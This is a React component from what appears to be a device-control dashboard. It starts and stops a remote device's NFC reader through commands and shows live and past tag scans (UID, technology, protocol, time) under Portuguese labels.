import { useEffect, useState } from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';

export default function NFCPanel({ deviceId, onBack, sendCmd }) {
  const nfcData = useStore(s => s.deviceNfc);
  const [scans, setScans] = useState([]);
  const [reading, setReading] = useState(false);

  useEffect(() => {
    fetch(`/api/devices/${deviceId}/nfc`).then(r => r.json()).then(setScans).catch(() => {});
  }, [deviceId]);

  // Listen for live NFC scans
  useEffect(() => {
    const handler = (e) => {
      let msg; try { msg = JSON.parse(e.data); } catch { return; }
      if (msg.type === 'nfc_scan' && msg.device_id === deviceId) {
        setScans(prev => [{ ...msg.data, ts: msg.ts }, ...prev]);
      }
    };
    ws._ws?.addEventListener('message', handler);
    return () => ws._ws?.removeEventListener('message', handler);
  }, [deviceId]);

  function startReader() {
    sendCmd('START_NFC_READER');
    setReading(true);
  }
  function stopReader() {
    sendCmd('STOP_NFC_READER');
    setReading(false);
  }

  const last = scans[0] || nfcData || {};

  return (
    <div className="fade-up">
      <div className="row-sb mb12">
        <div className="bold txt-gold">📡 NFC READER</div>
        <button className="btn btn-ghost btn-sm" onClick={onBack}>← VOLTAR</button>
      </div>

      {/* NFC Reader card */}
      <div className="ctrl-group mb12">
        <div className="ctrl-group-header row-sb">
          <div className="row gap6"><span>📡</span> NFC READER</div>
          <span className={`pill ${reading ? 'pill-green' : 'pill-gold'}`}>{reading ? 'READING' : 'READY'}</span>
        </div>
        <div className="ctrl-group-body">
          <div className="txt-xs txt-dim mb8">Leitor de proximidade</div>
          {reading
            ? <button className="btn btn-red btn-block" onClick={stopReader}>⏹ STOP READER</button>
            : <button className="btn btn-blue btn-block" onClick={startReader}>📡 START READER</button>
          }
        </div>
      </div>

      {/* NFC Info */}
      <div className="ctrl-group mb12">
        <div className="ctrl-group-header row-sb">
          <div className="row gap6"><span>📶</span> NFC INFO</div>
          <span style={{ fontSize: 16 }}>⚙</span>
        </div>
        <div className="ctrl-group-body">
          {[
            ['UID',        last.uid       || '04:XX:XX:XX:XX'],
            ['TECNOLOGIA', last.tech      || 'MIFARE / ISO 14443'],
            ['PROTOCOLO',  last.protocol  || 'NFC-A · 106 kbps'],
            ['ÚLTIMO SCAN',last.ts ? new Date(last.ts).toLocaleString() : 'Aguardando leitura'],
          ].map(([label, val]) => (
            <div key={label} className="row-sb" style={{ padding: '6px 0', borderBottom: '1px solid rgba(212,149,10,.08)' }}>
              <span className="txt-xs txt-dim" style={{ letterSpacing: 1 }}>{label}</span>
              <span className="txt-xs txt-mono" style={{ color: 'var(--text2)', textAlign: 'right' }}>{val}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Scan history */}
      {scans.length > 0 && (
        <div className="section">
          <div className="section-title">Histórico de Scans</div>
          <div style={{ maxHeight: 250, overflowY: 'auto' }}>
            {scans.slice(0, 20).map((s, i) => (
              <div key={i} className="card card-sm mb8">
                <div className="row-sb">
                  <span className="txt-sm bold txt-gold">{s.uid || 'Unknown UID'}</span>
                  <span className="txt-xs txt-dim">{s.ts ? new Date(s.ts).toLocaleTimeString() : ''}</span>
                </div>
                <div className="txt-xs txt-dim mt4">{s.tech || ''} · {s.protocol || ''}</div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
